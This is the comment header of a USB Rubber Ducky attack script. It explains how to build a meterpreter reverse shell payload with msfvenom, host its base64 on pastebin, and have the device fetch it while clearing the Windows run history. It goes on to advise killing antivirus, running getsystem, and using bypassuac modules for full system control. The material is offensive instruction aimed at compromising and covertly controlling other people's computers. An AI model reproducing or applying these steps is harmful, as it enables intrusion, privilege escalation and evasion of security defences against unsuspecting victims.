REM Description: Makes a meterpreter reverse shell by downloading base64 from pastebin. Clears run menu history afterwards.

REM Configuration:
REM Generate payload using this command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f psh-cmd --smallest Cut the payload down to JUST the base64. 
REM Upload to pastebin, my example: https://pastebin.com/KQpwbiRS. 
REM Then, simply convert this URL to a raw URL by adding a /raw/ in it (https://pastebin.com/raw/KQpwbiRS) or by clicking on the "raw" button and copying the link.
REM Now you have your URL!
REM You can URL shorten it if you'd like, just make sure you use the raw link and not the normal pastebin link.
REM Now change the $u='YOUR_LINK' to your URL (e.g. $u='https://pastebin.com/raw/KQpwbiRS'). 
REM Then simply upload it to your rubber ducky, and you can get extremely fast shells.

REM NOTE: It is recommended you migrate the shell and kill antivirus as soon as possible, as most antiviruses will pick up on a meterpreter shell and kill it. 
REM Running getsystem command on meterpreter is also great. 
REM Use the windows/local/bypassuac modules (find them with the command search bypassuac, 
REM I find that exploit/windows/local/bypassuac_injection_winsxs works very well for my Windows 10 device, disabled antivirus of course!) for Windows 8 and up.
REM This will allow you to bypass the UAC on windows, any level, and be able to freely run the getsystem command, which essentially lets you do anything.
